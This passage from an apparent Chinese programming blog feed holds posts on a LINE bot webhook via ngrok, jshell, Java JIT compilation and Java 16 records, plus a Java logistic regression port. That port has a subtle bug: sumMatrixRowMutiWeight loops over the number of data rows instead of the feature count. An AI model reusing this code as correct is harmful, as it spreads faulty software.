class="number">89.</span>ngrok.io -&gt; http://localhost:<span class="number">8000</span></span><br><span class="line"></span><br><span class="line">Connections                   ttl     opn     rt1     rt5     p50     p90     </span><br><span class="line">                              <span class="number">13</span>      <span class="number">0</span>       <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.32</span>    <span class="number">0.94</span>    </span><br><span class="line"></span><br><span class="line">HTTP Requests</span><br></pre></td></tr></table></figure><p><a href="https://3327-218-166-17-89.ngrok.io">https://3327-218-166-17-89.ngrok.io</a> 就是 ngrok 幫我建立在外網的一個隨機網址，接下來將此網址複製，並在後面加上 /callback (仔細看程式，程式會在這個網址回應)貼到 <a href="https://developers.line.biz/console">https://developers.line.biz/console</a> 中 Messaging API settings 內的 Webhook URL，貼完按下 verify 基本上就可以驗證成功了。</p><p>想要開啟 ngrok 提供的 Dashboard 的話請按下 Ctrl + 點選 Web Interface後面的網址，例如 <a href="http://127.0.0.1:4041">http://127.0.0.1:4041</a> 。</p><p>如果需要多個 callback URL 的話，原先官方給的資料是換行填寫，但是我實測他換行功能好像鎖起來了，或許可以發一下 issue 詢問。</p><p>接下來用自己的手機將創建出來的機器人加為好友之後就可以開始玩了。</p><h3 id="該從哪裡開始下手去對於程式碼做出改變"><a class="markdownIt-Anchor" href="#該從哪裡開始下手去對於程式碼做出改變"></a> 該從哪裡開始下手去對於程式碼做出改變</h3><p>找到callback()裡面的這個然後就可以先試著做更改了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event, MessageEvent):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event.message, TextMessage):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    line_bot_api.reply_message(</span><br><span class="line">        event.reply_token,</span><br><span class="line">        TextSendMessage(text=event.message.text)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>在加入好友之後，可以對機器人進行對話。</p><p>例如對它說一個 hi。</p><p>接下來我幫大家捕捉了程式碼當中的 event 查看內部到底有什麼呢 ?</p><p>event 的格式如下:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14651735376424&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hi&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;active&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;replyToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;48d30e0ca8594d5fb1f9d956f561597e&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;userId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ud3903825f232e3d357c074ece1efd5dd&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1630174218140</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;message&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>可以從上很明顯的看出，使用者說了一個 hi，如果呼叫此函式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line_bot_api.reply_message(</span><br><span class="line">    event.reply_token,</span><br><span class="line">    TextSendMessage(text=event.message.text)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>機器人就會回應使用者一個 hi。</p><p>所以可以直接拿這個框架，配合簡單的字串處理找出關鍵字，回復使用者一些訊息。</p><p>基本上做到這裡就差不多完成了，但是 line bot 回復的時候還會多加上一段話。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感謝您的訊息！</span><br><span class="line"></span><br><span class="line">很抱歉，本帳號無法個別回覆用戶的訊息。</span><br><span class="line">敬請期待我們下次發送的內容喔(content)</span><br></pre></td></tr></table></figure><p>這是因為在 Messaging API settings 中的 Auto-reply messages 有預設自動回復，點擊 edit 選項之後，將在進階設定內的自動回應訊息設定關閉就好了。</p><p>好累喔，不知不覺六千多字，圖片等資料傳送和處裡以及 line 的一些有趣功能下次再寫，寫部落格比直接實作難多了。</p>]]></content>
      
      
      <categories>
          
          <category> line bot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在部落格上面跑python和R</title>
      <link href="/try-to-use-python-or-R-in-my-blog/"/>
      <url>/try-to-use-python-or-R-in-my-blog/</url>
      
        <content type="html"><![CDATA[<p>其實也不算專案，就只是我弄得小嘗試而已。</p><script type="text/javascript" src="//cdn.datacamp.com/dcl-react.js.gz"></script><p>可以在這裡跑python</p><div data-datacamp-exercise data-lang="python">    <code data-type="sample-code">a = 5 <br>        print(a)</code></div><p>可以在這裡跑R</p><div data-datacamp-exercise data-lang="r">    <code data-type="sample-code">a <- 5 <br>        print(a)</code></div><p>編譯過程沒有在本地快速，需要幾秒啟動時間，但還算方便(?)</p>]]></content>
      
      
      <categories>
          
          <category> 專案 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>jshell</title>
      <link href="/jshell/"/>
      <url>/jshell/</url>
      
        <content type="html"><![CDATA[<p>因為真的很好玩就開一篇來介紹 jshell 這個東西。</p><p>它位於&quot;\bin&quot;路徑之下，例如&quot;C:\Program Files\Java\jdk-16.0.1\bin&quot;資料夾當中，可以找到jshell.exe。</p><h2 id="jshell能夠做到什麼"><a class="markdownIt-Anchor" href="#jshell能夠做到什麼"></a> jshell能夠做到什麼?</h2><p>這是一個 REPL(Read-Eval-Print Loop) 的交互式實時命令工具。</p><img src="/jshell/1.png" class=""><p>大概像是這樣，其實滿酷的。</p><span id="more"></span><p>官方文檔說 jshell 的功能是這樣。</p><p><strong>JShell helps you try out code and easily explore options as you develop your program. You can test individual statements, try out different variations of a method, and experiment with unfamiliar APIs within the JShell session. JShell doesn’t replace an IDE. As you develop your program, paste code into JShell to try it out, and then paste working code from JShell into your program editor or IDE.</strong></p><p>基本上就是可以把 code 在 JShell 中進行測試，測完再放入自己的程式當中。</p><p>另外可以透過 /help 來查詢指令。</p><img src="/jshell/2.png" class=""><h2 id="總結"><a class="markdownIt-Anchor" href="#總結"></a> 總結</h2><p>好啦，感覺我也不會用到這個功能，但是挖文檔挖到覺得很好玩，所以分享一下。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java邏輯回歸程式實作範例</title>
      <link href="/random-logistic-regression-code/"/>
      <url>/random-logistic-regression-code/</url>
      
        <content type="html"><![CDATA[<p>改寫自此python code，因為網路上流傳太多版本<s>大陸互相亂爬導致到處都有</s>，找不到出處故只附此code，若侵犯版權請盡速與我聯繫。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 這個是別人的啦!不是我寫的。</span></span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sigmoid函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">inX</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1</span> + np.exp(-inX))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 梯度上升</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradAscent</span>(<span class="params">dataMatIn, classLabels</span>):</span><br><span class="line">    dataMatrix = np.mat(dataMatIn)</span><br><span class="line">    labelMat = np.mat(classLabels).transpose()</span><br><span class="line">    m, n = dataMatrix.shape</span><br><span class="line">    alpha = <span class="number">0.01</span></span><br><span class="line">    maxCycles = <span class="number">500</span></span><br><span class="line">    weights = np.ones((n, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(maxCycles):</span><br><span class="line">        h = sigmoid(dataMatrix * weights)</span><br><span class="line">        error = (labelMat - h)</span><br><span class="line">        weights = weights + alpha * dataMatrix.transpose() * error</span><br><span class="line">    <span class="keyword">return</span> weights</span><br></pre></td></tr></table></figure><p>下面是改寫後的 java code，按照註解來，使用上只要動到訓練和預測的部分就可以了。</p><p>效能比不上有照論文實作優化過的，但我覺得是很好的學習範例，畢竟邏輯回歸可以當分類和回歸用，可以都玩玩看啦，希望大家玩得開心也得到一些收穫。</p><span id="more"></span><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> afan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: Afan Chen</span></span><br><span class="line"><span class="comment"> * 機器學習算法:邏輯回歸</span></span><br><span class="line"><span class="comment"> * 損失函數:交叉熵</span></span><br><span class="line"><span class="comment"> * 激勵函數:sigmoid</span></span><br><span class="line"><span class="comment"> * 疊代算法:隨機梯度上升算法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogisticRegression</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * sigmoid函數</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num 權重與特徵的內積</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 事件發生機率</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">sigmoid</span><span class="params">(<span class="type">double</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1</span> + Math.exp(-num));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 將訓練結果回傳</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datas 資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inx 第幾筆資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weights 權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 權重與特徵的內積</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">sumMatrixRowMutiWeight</span><span class="params">(<span class="type">double</span>[][] datas, <span class="type">int</span> inx, <span class="type">double</span>[] weights)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; datas.length; i++) &#123;</span><br><span class="line">            res += datas[inx][i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 將該筆數據跑過一次得到新的權重後回傳</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span>[] adjustWeights(<span class="type">double</span>[][] datas, <span class="type">int</span> inx, <span class="type">double</span>[] weights, <span class="type">double</span> alpha , <span class="type">double</span> error) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[weights.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; weights.length; i++) &#123;</span><br><span class="line">            res[i] = alpha * error * datas[inx][i] + weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 訓練模型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datas 資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> labels 標籤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span>[] stocGradAscentl(<span class="type">double</span>[][] datas, <span class="type">double</span>[] labels) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[datas[<span class="number">0</span>].length];</span><br><span class="line"></span><br><span class="line">        Arrays.fill(res, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; datas.length; j++) &#123;</span><br><span class="line">                <span class="type">double</span> <span class="variable">alpha</span> <span class="operator">=</span> <span class="number">4</span> / (<span class="number">1.0</span> + j + i) + <span class="number">0.01</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">randIndex</span> <span class="operator">=</span> r.nextInt(datas.length);</span><br><span class="line">                <span class="type">double</span> <span class="variable">h</span> <span class="operator">=</span> sigmoid(sumMatrixRowMutiWeight(datas, randIndex, res));</span><br><span class="line">                <span class="type">double</span> error=labels[randIndex]-h;</span><br><span class="line">                res = adjustWeights(datas, randIndex, res, alpha,error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 訓練模型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datas 資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> labels 標籤</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> maxIter 疊代次數，沒設終止條件等他跑完</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 特徵權重</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span>[] stocGradAscentl(<span class="type">double</span>[][] datas, <span class="type">double</span>[] labels, <span class="type">int</span> maxIter) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[datas[<span class="number">0</span>].length];</span><br><span class="line"></span><br><span class="line">        Arrays.fill(res, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; maxIter; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; datas.length; j++) &#123;</span><br><span class="line">                <span class="type">double</span> <span class="variable">alpha</span> <span class="operator">=</span> <span class="number">4</span> / (<span class="number">1.0</span> + j + i) + <span class="number">0.01</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">randIndex</span> <span class="operator">=</span> r.nextInt(datas.length);</span><br><span class="line">                <span class="type">double</span> <span class="variable">h</span> <span class="operator">=</span> sigmoid(sumMatrixRowMutiWeight(datas, randIndex, res));</span><br><span class="line">                <span class="type">double</span> error=labels[randIndex]-h;</span><br><span class="line">                res = adjustWeights(datas, randIndex, res, alpha,error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測發生機率</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> feature 特徵值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weights 權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 回傳機率</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">predictionProbability</span><span class="params">(<span class="type">double</span>[] feature, <span class="type">double</span>[] weights)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">prob</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; feature.length; i++) &#123;</span><br><span class="line">            prob += feature[i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        prob = sigmoid(prob);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prob;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測結果(哪種可能比較大</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> feature 特徵值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weights 權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 回傳預測</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">prediction</span><span class="params">(<span class="type">double</span>[] feature, <span class="type">double</span>[] weights)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">prob</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; feature.length; i++) &#123;</span><br><span class="line">            prob += feature[i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        prob = sigmoid(prob);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prob&gt;=<span class="number">0.5</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JIT(Just In Time)，Java的即時編譯特性</title>
      <link href="/jit/"/>
      <url>/jit/</url>
      
        <content type="html"><![CDATA[<p>這篇文的動機是因為最近一直聽到別人勸告新手與其學 java 不如學 c ，原因是<strong>java速度很慢</strong>，這個理由我不太能接受，所以就寫一篇文章來說明為什麼 java 的速度其實跟 c、c++ 差不多，在特定情況下藉由 JIT 技術已經比 C 或 C++ 快了。</p><p>首先，我們要知道 java 的編譯過程。</p><p>java 和 c 的 compiler 滿不一樣的，java 不同於 c 直接 compile 成 CPU 的指令，他是產生**統一規格的 bytecode，在運行期間，JVM 才會 interpret bytecode，所以只需要 build 一份 bytecode 就可以在各平台上運行。</p><p>這樣的編譯流程帶來跨平台的好處之外，還有運行效能的缺點，所以在2000年左右，java開始研究 <a href="https://www.oracle.com/java/technologies/javase/javase-core-technologies-apis.html">HotSpot</a> 的核心技術。</p><p>這裡要先講一個滿常發生的程式特性，<strong>大部分的運行時間被運用在少數的程式碼上</strong>。</p><span id="more"></span><h3 id="jit的在編譯階段的優化"><a class="markdownIt-Anchor" href="#jit的在編譯階段的優化"></a> JIT的在編譯階段的優化</h3><p>hot spot 的意思是 bytecode 當中常被使用到的程式碼片段，JVM 在運行程式的時候，先分析和找出這些程式碼片段，接下來將這些程式碼片段做大範圍的最佳化、以及將程式碼 compile 成特定處理器的指令。</p><p>簡單來說，就是編譯器自動幫你重構被重複使用的程式碼來加速程式的效能。(題外話，Oracle 推薦大家用他的 JDK 的理由就是他自稱有很多的黑科技優化，但很遺憾我還是選擇 openJDK。)</p><p><img src="https://miro.medium.com/max/1094/1*N4ns2d0oFaoN3EalxVd-CQ.png" alt="" /></p><p>這是一張 C 和 java 的效能比較圖，比較項目是大矩陣的運算耗時，詳情請看<a href="https://medium.com/swlh/a-performance-comparison-between-c-java-and-python-df3890545f6d">文章</a>。</p><p>C 語言在使用 GCC 編譯時，若未經過 <a href="https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html">-O2 and -O3 optimization</a>，速度其實不會比 java 快，當然這是因為GCC把這些黑科技優化鎖起來了的關係，java 的優勢我覺得還是在開發上面的便利和生態系，所謂的 java 比 c 或 c++ 快的論點我覺得都是在特定情況下的吹捧。</p><p>但是還是希望大家能夠有一個概念，<strong>現代的 java 速度跟 c 的差異其實沒有大家想像的大</strong>。</p><p><img src="https://cdn.discordapp.com/attachments/756159774231494706/840847434791124992/image0.png" alt="" /></p><p>程式語言效能圖，強者我朋友mes在golang教學中載的圖忘記來源。</p><p>(由於程式碼寫法的問題，不一定所有的 source code 被編譯的時候都會被優化，有的更可能造成執行速度變慢)</p><h3 id="jit的在執行階段的優化"><a class="markdownIt-Anchor" href="#jit的在執行階段的優化"></a> JIT的在執行階段的優化</h3><p>如果有一段組合語言在程式碼當中出現了1000次，直譯器(interpreter) 會重複組譯1000次同樣的機器語言，JIT 會將這段機器語言先保留在快取記憶體內，每當遇到的時後就直接拿這段機器語言來執行，不用再組譯999次。</p><h3 id="jit的編譯情形"><a class="markdownIt-Anchor" href="#jit的編譯情形"></a> JIT的編譯情形</h3><p><img src="https://img-blog.csdnimg.cn/20190211113255885.png" alt="" /></p><p>此外，為了降低 JIT 對編譯造成的負擔，JIT目前僅針對迴圈等會重複出現的程式碼做優化的動作。</p><h3 id="jit的技術支持"><a class="markdownIt-Anchor" href="#jit的技術支持"></a> JIT的技術支持</h3><p>JIT 很大一部分建立於 java 的 garbage collection 之上，若想要更進一步的了解可以參閱<a href="https://www.oracle.com/webfolder/technetwork/tutorials/obe/java/gc01/index.html">官方說明</a>。</p><h3 id="安全問題"><a class="markdownIt-Anchor" href="#安全問題"></a> 安全問題</h3><p>JIT 編譯的實現包括將 source code 或 byte code 編譯為機器代碼並執行。通常這是直接在內存中完成的 -JIT 編譯器將機器代碼直接輸出到內存中並立即執行，而不是將其輸出到硬碟上。</p><p>然後像大部分的預編譯一樣，將程式碼作為單獨的程序調用。在現代體系結構中，由於 Executable space protection (可執行空間)的保護，這會帶來一個問題–無法執行任意記憶體，否則會存在潛在的安全漏洞。</p><p>因此，必須將記憶體先標記為可執行。出於安全原因，應在將代碼寫入內存並標記為只讀之後執行此操作。</p><p>JIT Spraying 是一類計算機安全漏洞利用，它使用 JIT compilation for heap spraying，然後生成的記憶體是可執行的，如果可以將執行轉移到 heap 當中，就可以利用該漏洞。</p><h3 id="afan閒聊"><a class="markdownIt-Anchor" href="#afan閒聊"></a> afan閒聊</h3><p><a href="https://afan0918.github.io/java/java16/">java 16</a> 優化了他的 garbage collection 功能，利用平行處理把垃圾回收機制的運行壓在 1ms (毫秒)之內，又更快了。</p><p>話說在去年底，PHP 8.0 也引入了 JIT，雖然PHP是世界上最好的語言梗一直被玩，但好像真的有在不斷改進與進化。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java16的新特性</title>
      <link href="/java-16/"/>
      <url>/java-16/</url>
      
        <content type="html"><![CDATA[<p>雖然好像慢了，但還是小小來記錄一下java 16到底有什麼具體的改變，方便我跟版本，畢竟9月就要發布java 17(LTS,長期穩定支援版本)了，總不能一直抱著祖傳java 8。</p><p>我就挑我覺得比較酷的來說，因為網路上的內容基本上都講得滿模糊的，所以乾脆直接看oracle的java document，再加入我自己的一點理解。</p><h2 id="record-classes"><a class="markdownIt-Anchor" href="#record-classes"></a> Record Classes</h2><p>Record Classes的官方預設用途是被拿來實作簡單的&quot;數據載體&quot;的，基本上就是一個我覺得還算好用的語法糖。</p><span id="more"></span><p>具體功能大概是這樣。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123; &#125;</span><br></pre></td></tr></table></figure><p>開發者寫的這一段code等效於以下的程式碼。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">double</span> length;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">double</span> width;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.length = length;</span><br><span class="line">        <span class="built_in">this</span>.width = width;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">double</span> <span class="title function_">length</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="built_in">this</span>.length; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">width</span><span class="params">()</span>  &#123; <span class="keyword">return</span> <span class="built_in">this</span>.width; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Implementation of equals() and hashCode(), which specify</span></span><br><span class="line">    <span class="comment">// that two record objects are equal if they</span></span><br><span class="line">    <span class="comment">// are of the same type and contain equal field values.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> equals...</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> hashCode...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// An implementation of toString() that returns a string</span></span><br><span class="line">    <span class="comment">// representation of all the record class&#x27;s fields,</span></span><br><span class="line">    <span class="comment">// including their names.</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;...&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以從上面看到輸入的數據會被<strong>寫死在class創建的時候</strong>，並且自動生成equals，hashCode和toString function，我覺得不算驚艷，但還不錯，可以快速的來處理簡單得數據資料。</p><p>來講一下equals()跟hashCode()的用途，在java當中，==運算子比較的是物件實體或者說是記憶體位置是否相同，而equals()可以比較物件的值是否相同。</p><p>hashCode()則是會回傳一個將過hash函數處裡的int值，可以被用來做HashMap、HashSet等雜湊資料結構的索引，讓使用者可以以hashCode()快速實現相關結構。</p><p>另外不能宣告instance variables(non-static fields)或者是instance initializers。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Field declarations must be static:</span></span><br><span class="line">    BiFunction&lt;Double, Double, Double&gt; diagonal;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Instance initializers are not allowed in records:</span></span><br><span class="line">    &#123;</span><br><span class="line">        diagonal = (x, y) -&gt; Math.sqrt(x*x + y*y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>類似這樣的code將不會被編譯。</p><p>但可以在Record Classes當中聲明instance methods，像是以下程式碼。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">record</span> <span class="title class_">Rectangle</span><span class="params">(<span class="type">double</span> length, <span class="type">double</span> width)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Nested record class</span></span><br><span class="line">    <span class="keyword">record</span> <span class="title class_">RotationAngle</span><span class="params">(<span class="type">double</span> angle)</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> RotationAngle &#123;</span><br><span class="line">            angle = Math.toRadians(angle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Public instance method</span></span><br><span class="line">    <span class="keyword">public</span> Rectangle <span class="title function_">getRotatedRectangleBoundingBox</span><span class="params">(<span class="type">double</span> angle)</span> &#123;</span><br><span class="line">        <span class="type">RotationAngle</span> <span class="variable">ra</span> 